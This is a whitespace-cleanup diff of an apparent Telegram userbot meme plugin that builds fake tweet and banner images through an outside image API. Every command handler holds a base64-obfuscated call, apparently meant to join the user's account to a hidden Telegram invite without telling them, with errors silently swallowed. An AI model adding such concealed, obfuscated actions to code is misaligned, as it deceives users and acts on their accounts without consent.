@@ -18,7 +18,7 @@ EMOJI_PATTERN = re.compile(
     "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
     "\U0001FA00-\U0001FA6F"  # Chess Symbols
     "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
-    "\U00002702-\U000027B0"  # Dingbats 
+    "\U00002702-\U000027B0"  # Dingbats
     "]+")
 
 
@@ -36,7 +36,7 @@ async def trumptweet(text):
         with open("temp.png", "wb") as f:
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
+        img.save("temp.jpg", "jpeg")
         return "temp.jpg"
 
 async def changemymind(text):
@@ -49,9 +49,9 @@ async def changemymind(text):
         with open("temp.png", "wb") as f:
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
+        img.save("temp.jpg", "jpeg")
         return "temp.jpg"
-    
+
 async def kannagen(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
@@ -62,9 +62,9 @@ async def kannagen(text):
         with open("temp.png", "wb") as f:
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
-        img.save("temp.webp", "webp")    
-        return "temp.webp"    
-    
+        img.save("temp.webp", "webp")
+        return "temp.webp"
+
 async def moditweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
@@ -75,9 +75,9 @@ async def moditweet(text):
         with open("temp.png", "wb") as f:
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"     
-    
+        img.save("temp.jpg", "jpeg")
+        return "temp.jpg"
+
 async def tweets(text1,text2):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
@@ -88,8 +88,8 @@ async def tweets(text1,text2):
         with open("temp.png", "wb") as f:
             f.write(requests.get(sandy).content)
         img = Image.open("temp.png").convert("RGB")
-        img.save("temp.jpg", "jpeg")    
-        return "temp.jpg"      
+        img.save("temp.jpg", "jpeg")
+        return "temp.jpg"
 
 
 @register(pattern="^.trump(?: |$)(.*)", outgoing=True)
@@ -113,12 +113,12 @@ async def nekobot(cat):
         san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await cat.client(san)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     catfile = await trumptweet(text)
-    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
+    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id )
     await cat.delete()
-    
+
 @register(pattern="^.modi(?: |$)(.*)", outgoing=True)
 async def nekobot(cat):
     text = cat.pattern_match.group(1)
@@ -140,12 +140,12 @@ async def nekobot(cat):
         san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await cat.client(san)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     catfile = await moditweet(text)
-    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
-    await cat.delete() 
-    
+    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id )
+    await cat.delete()
+
 @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
 async def nekobot(cat):
     text = cat.pattern_match.group(1)
@@ -162,17 +162,17 @@ async def nekobot(cat):
         else:
             await cat.edit("Give text for to write on banner, man")
             return
-    await cat.edit("Your banner is under creation wait a sec...")    
+    await cat.edit("Your banner is under creation wait a sec...")
     try:
         san = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await cat.client(san)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     catfile = await changemymind(text)
-    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
+    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id )
     await cat.delete()
-    
+
 @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
 async def nekobot(cat):
     text = cat.pattern_match.group(1)
@@ -189,17 +189,17 @@ async def nekobot(cat):
         else:
             await cat.edit("what should kanna write give text")
             return
-    await cat.edit("Kanna is writing your text...")        
+    await cat.edit("Kanna is writing your text...")
     try:
         san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await cat.client(san)
     except:
-        pass   
+        pass
     text = deEmojify(text)
     catfile = await kannagen(text)
-    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
+    await cat.client.send_file(cat.chat_id , catfile , reply_to = reply_to_id )
     await cat.delete()
-    
+
 CMD_HELP.update({
 "imgmeme":
 "Fun purpose 😛😛😏😏\
